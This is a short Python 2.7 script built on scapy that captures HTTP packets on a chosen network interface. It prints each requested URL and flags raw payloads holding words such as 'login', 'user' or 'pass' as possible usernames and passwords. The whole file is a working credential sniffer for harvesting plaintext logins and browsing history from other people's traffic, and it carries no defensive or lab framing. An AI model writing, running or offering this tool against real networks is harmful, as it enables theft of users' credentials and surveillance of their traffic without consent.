#!/usr/bin/python2.7
# Using a 3rd party module scap_http pip install scap_http to filter http properties method
# filter only credentials which contains login, username, password as keyword
# extract the urls visited

import scapy.all as scapy
from scapy.layers import http
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", dest="interface", help="Specify an interface to capture packets")
options = parser.parse_args()


def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def geturl(packet):
	return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)


def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = str(packet[scapy.Raw].load)
		keywords = ['login', 'LOGIN', 'user', 'pass', 'username', 'password', 'Login']

		for keyword in keywords:
			if keyword in load:
				return load


def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = geturl(packet)
		print("[+]HTTPRequest > " + url)
		lignin = get_login_info(packet)

		if lignin:
			print("\n\n[+]Possible username and password " + lignin + "\n\n")


sniff(options.interface)
